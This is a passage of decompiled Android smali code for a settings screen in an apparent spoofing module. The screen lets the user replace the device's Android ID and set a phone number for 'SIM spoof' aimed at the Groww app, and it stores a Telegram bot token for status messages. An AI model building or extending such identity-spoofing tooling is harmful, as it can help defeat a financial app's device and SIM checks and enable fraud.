    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    .line 51
    sget v0, Lcom/rebel/module/R$id;->tv_telegram_status:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    .line 52
    sget v0, Lcom/rebel/module/R$id;->btn_validate_telegram:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    .line 55
    const-string v0, "zet_prefs"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/rebel/module/ZetSettingsActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 56
    .local v0, "prefs":Landroid/content/SharedPreferences;
    const-string v1, "spoofed_android_id"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 57
    .local v1, "saved":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 58
    invoke-virtual {p0}, Lcom/rebel/module/ZetSettingsActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "android_id"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 60
    :cond_0
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->etAndroidId:Landroid/widget/EditText;

    invoke-virtual {v2, v1}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 63
    invoke-direct {p0}, Lcom/rebel/module/ZetSettingsActivity;->loadGrowwNumber()V

    .line 66
    invoke-direct {p0}, Lcom/rebel/module/ZetSettingsActivity;->loadTelegramConfig()V

    .line 67
    return-void
.end method

.method public onDataManagementClick(Landroid/view/View;)V
    .locals 2
    .param p1, "v"    # Landroid/view/View;

    .line 129
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/rebel/module/ZetDataManagementActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->startActivity(Landroid/content/Intent;)V

    .line 130
    return-void
.end method

.method protected onPause()V
    .locals 0

    .line 71
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 72
    invoke-direct {p0}, Lcom/rebel/module/ZetSettingsActivity;->saveTelegramConfig()V

    .line 73
    return-void
.end method

.method public onRandomizeAndroidId(Landroid/view/View;)V
    .locals 2
    .param p1, "v"    # Landroid/view/View;

    .line 92
    const/16 v0, 0x10

    invoke-direct {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->generateRandomHex(I)Ljava/lang/String;

    move-result-object v0

    .line 93
    .local v0, "newId":Ljava/lang/String;
    iget-object v1, p0, Lcom/rebel/module/ZetSettingsActivity;->etAndroidId:Landroid/widget/EditText;

    invoke-virtual {v1, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 94
    return-void
.end method

.method public onSaveAndroidId(Landroid/view/View;)V
    .locals 4
    .param p1, "v"    # Landroid/view/View;

    .line 98
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etAndroidId:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 99
    .local v0, "id":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0x10

    const/4 v3, 0x0

    if-ne v1, v2, :cond_1

    const-string v1, "[0-9a-f]{16}"

    invoke-virtual {v0, v1}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    goto :goto_0

    .line 103
    :cond_0
    const-string v1, "zet_prefs"

    invoke-virtual {p0, v1, v3}, Lcom/rebel/module/ZetSettingsActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "spoofed_android_id"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 104
    invoke-direct {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->writeIdFile(Ljava/lang/String;)V

    .line 105
    const-string v1, "\u2713 Android ID saved \u2014 relaunch app to apply"

    invoke-static {p0, v1, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 106
    return-void

    .line 100
    :cond_1
    :goto_0
    const-string v1, "Android ID must be exactly 16 hex characters (0-9, a-f)"

    invoke-static {p0, v1, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 101
    return-void
.end method

.method public onSaveGrowwNumber(Landroid/view/View;)V
    .locals 5
    .param p1, "v"    # Landroid/view/View;

    .line 134
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etGrowwNumber:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    .line 135
    .local v0, "number":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_0

    .line 136
    const-string v1, "Please enter a phone number"

    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 137
    return-void

    .line 140
    :cond_0
    :try_start_0
    new-instance v1, Lcom/rebel/module/ConfigManager;

    invoke-direct {v1}, Lcom/rebel/module/ConfigManager;-><init>()V

    .line 142
    .local v1, "cm":Lcom/rebel/module/ConfigManager;
    invoke-virtual {v1, v0}, Lcom/rebel/module/ConfigManager;->setGrowwMobileNo(Ljava/lang/String;)V

    .line 143
    const/4 v3, 0x1

    invoke-virtual {v1, v3}, Lcom/rebel/module/ConfigManager;->setFixGrowwEnabled(Z)V

    .line 145
    invoke-virtual {v1, v0}, Lcom/rebel/module/ConfigManager;->setMobileNo(Ljava/lang/String;)V

    .line 146
    invoke-virtual {v1, v3}, Lcom/rebel/module/ConfigManager;->setSpoofMobileEnabled(Z)V

    .line 147
    const-string v3, "\u2713 Number saved \u2014 SIM spoof + SMS mobile updated"

    invoke-static {p0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v3

    invoke-virtual {v3}, Landroid/widget/Toast;->show()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 150
    .end local v1    # "cm":Lcom/rebel/module/ConfigManager;
    goto :goto_0

    .line 148
    :catch_0
    move-exception v1

    .line 149
    .local v1, "e":Ljava/lang/Exception;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Failed to save: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {p0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 151
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onValidateTelegramClick(Landroid/view/View;)V
    .locals 5
    .param p1, "v"    # Landroid/view/View;

    .line 213
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    const-string v1, ""

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_0
    move-object v0, v1

    .line 214
    .local v0, "botToken":Ljava/lang/String;
    :goto_0
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    if-eqz v2, :cond_1

    iget-object v1, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    .line 216
    .local v1, "chatId":Ljava/lang/String;
    :cond_1
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_3

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    goto :goto_1

    .line 221
    :cond_2
    invoke-direct {p0}, Lcom/rebel/module/ZetSettingsActivity;->saveTelegramConfig()V

    .line 223
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setEnabled(Z)V

    .line 224
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    const-string v4, "Validating\u2026"

    invoke-virtual {v2, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 225
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setVisibility(I)V

    .line 226
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    const-string v3, "Sending test message..."

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 227
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    const v3, -0x777778

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V

    .line 229
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda3;

    invoke-direct {v3, p0, v0, v1}, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda3;-><init>(Lcom/rebel/module/ZetSettingsActivity;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 262
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 263
    return-void

    .line 217
    :cond_3
    :goto_1
    const-string v2, "\u26a0\ufe0f Enter Bot Token and Chat ID first"

    invoke-static {p0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 218
    return-void
.end method
